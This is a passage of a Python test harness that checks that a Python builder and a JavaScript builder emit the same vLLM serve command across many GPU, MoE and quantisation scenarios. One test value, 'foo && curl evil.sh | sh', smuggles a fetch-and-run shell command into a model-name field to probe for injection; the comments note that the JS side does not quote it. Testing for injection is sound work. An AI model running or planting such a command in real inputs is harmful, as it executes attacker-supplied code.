# generate_report.py shell-quotes hf_model via shlex.quote() (see the
# injection tests in report.test.py); index.html's buildVllmCommand() never
# quotes anything, because the string it builds is only ever pasted back by
# the same person who typed it into their own browser tab, not exec'd from a
# shared file. The two engines are SUPPOSED to disagree on a value like this
# today — that is a real gap, just not a TP/DP one, and out of scope here.
# Naming and skipping it keeps that gap visible instead of it simply never
# being tried.
UNSAFE_HF_MODELS = ["foo && curl evil.sh | sh"]

MATRIX = []
i = 0
for n in GPU_COUNTS:
    for pc in PREFIX_CACHING_VALUES:
        g = i // 2
        MATRIX.append({
            "n_gpu": n, "prefix_caching": pc, "fits": True,
            "quant": QUANT_VALUES[g % len(QUANT_VALUES)],
            "is_moe": IS_MOE_VALUES[(g // 4) % len(IS_MOE_VALUES)],
            "kv_bpp": KV_BPP_VALUES[(g // 2) % len(KV_BPP_VALUES)],
            "ctx": CTX_VALUES[g % len(CTX_VALUES)],
            "hf_model": HF_MODEL_VALUES[g % len(HF_MODEL_VALUES)],
            "devices": 1,
            "skip_reason": None,
        })
        i += 1

# Every scenario above is a board that is one device, which is every card in
# today's catalog — so the whole command path was compared with the device
# derivation switched off. A dual-GCD board changes both flags that depend on
# it: a single module needs --tensor-parallel-size 2, and an MoE on it needs
# --enable-expert-parallel, neither of which a board count implies.
for n in (1, 2, 4, 9):
    for moe in (True, False):
        MATRIX.append({
            "n_gpu": n, "devices": 2, "prefix_caching": True, "fits": True,
            "quant": None, "is_moe": moe, "kv_bpp": 2, "ctx": 8192,
            "hf_model": "/opt/models/YourModel", "skip_reason": None,
        })

EXTRA_CASES = [
    # is_moe=True paired with n_gpu=1: the grid above never produces this —
    # is_moe only turns True once g >= 4, i.e. n_gpu >= 8 — so on its own it
    # never tests the n_gpu > 1 / gpuCount > 1 guard on
    # --enable-expert-parallel at the one count where dropping that guard
    # would actually change the output (elsewhere, is_moe=True only ever
    # co-occurs with n_gpu > 1 anyway, so the guard is a no-op there).
    {"n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
     "is_moe": True, "kv_bpp": 2, "ctx": 8192,
     "hf_model": "/opt/models/YourModel", "skip_reason": None},
    # fits=False short-circuits both engines to the same constant string
    # before n_gpu/quant/kv_bpp/ctx are ever read, so crossing it into the
    # main grid would mostly waste those axes on a state where they don't
    # show up. Two dedicated cases (different gpu_count/prefix_caching, so
    # this isn't just one data point) are enough to catch either engine's
    # message drifting from the other's.
    {"n_gpu": 4, "prefix_caching": True, "fits": False, "quant": None,
     "is_moe": False, "kv_bpp": 2, "ctx": 8192,
     "hf_model": "/opt/models/YourModel", "skip_reason": None},
    {"n_gpu": 12, "prefix_caching": False, "fits": False, "quant": "awq",
     "is_moe": True, "kv_bpp": 1, "ctx": 4096,
     "hf_model": "meta-llama/Llama-3.1-8B-Instruct", "skip_reason": None},
]
MATRIX.extend(EXTRA_CASES)

for unsafe in UNSAFE_HF_MODELS:
    MATRIX.append({
        "n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
        "is_moe": False, "kv_bpp": 2, "ctx": 8192, "hf_model": unsafe,
        "skip_reason": "known shell-quoting asymmetry (py quotes via shlex, js does not) — tracked separately, not TP/DP",
    })

# Both builders now read tp/dp off the comp/computed they are handed, instead
# of deriving the split themselves — that is what stops the command disagreeing
# with the figures printed beside it. So each side of this matrix derives one
# the way its own engine does, and the comparison below is still a comparison of
# two independent derivations, not of one shared number.
def py_comp(m):
    tp, dp = split_parallelism(device_count_for(
        {"n_gpu": m["n_gpu"], "gpu": {"devices": m.get("devices", 1)}}))
    return {"fits": m["fits"], "is_moe": m["is_moe"], "max_ctx_1": MAX_CTX_1,
            "tp": tp, "dp": dp}


py_cmds = [
    build_vllm_cmd(
        {"hf_model": m["hf_model"], "ctx": m["ctx"], "n_gpu": m["n_gpu"],
         "gpu": {"devices": m.get("devices", 1)},
         "quant": m["quant"], "prefix_caching": m["prefix_caching"],
         "kv_bpp": m["kv_bpp"]},
        py_comp(m),
    )
    for m in MATRIX
]

js_cmd_runner = r"""
const fs = require('fs');
const html = fs.readFileSync(process.argv[1], 'utf8');
function extract(sig) {
  const s = html.indexOf(sig);
  if (s === -1) throw new Error('not found in index.html: ' + sig);
  const e = html.indexOf('\n}\n', s);
  return html.slice(s, e + 2);
}
const src = extract('function splitParallelism(gpuCount) {')
          + extract('function parallelismFor(state) {')
          + extract('function buildVllmCommand(state, computed, modelPath) {');
const api = new Function(`${src}; return {buildVllmCommand, parallelismFor};`)();
const scenarios = JSON.parse(process.argv[2]);
const MAX_CTX_1 = 8192; // must match Python's MAX_CTX_1 above
console.log(JSON.stringify(scenarios.map((m) => {
  const state = {gpuCount: m.n_gpu, gpuDevices: m.devices || 1,
   quantMethod: m.quant || '', kvBytesPerValue: m.kv_bpp,
   prefixCaching: m.prefix_caching, contextLength: m.ctx};
  // The split this engine derives, standing in for the one computeInference()
  // would have returned — see py_comp() above for why the harness supplies it.
  const {tp, dp} = api.parallelismFor(state);
  return api.buildVllmCommand(
    state,
    {fits: m.fits, isMoE: m.is_moe, maxContextSingleUser: MAX_CTX_1, tp, dp},
    m.hf_model);
})));
"""
proc = subprocess.run(
    ["node", "-e", js_cmd_runner, os.path.join(ROOT, "index.html"), json.dumps(MATRIX)],
    capture_output=True, text=True)
if proc.returncode:
    print("  FAIL node command runner failed:\n" + proc.stderr)
    failed += 1
else:
    js_cmds = json.loads(proc.stdout)
    for m, py_cmd, js_cmd in zip(MATRIX, py_cmds, js_cmds):
        label = (f"n_gpu={m['n_gpu']} prefix_caching={m['prefix_caching']} fits={m['fits']} "
                 f"quant={m['quant']!r} is_moe={m['is_moe']} kv_bpp={m['kv_bpp']} ctx={m['ctx']} "
                 f"hf_model={m['hf_model']!r}")
        if m["skip_reason"]:
            print(f"  skip {label}")
            print(f"       reason: {m['skip_reason']}")
            if py_cmd != js_cmd:
                print(f"       (confirmed still diverges — py: {py_cmd!r} js: {js_cmd!r})")
            continue
        if py_cmd != js_cmd:
            print(f"  FAIL emitted vllm command differs ({label})")
            print(f"       py: {py_cmd!r}")
            print(f"       js: {js_cmd!r}")
            failed += 1
        else:
            print(f"  ok   emitted vllm command matches ({label})")
            passed += 1

print(f"\n{passed} passed, {failed} failed\n")
sys.exit(1 if failed else 0)
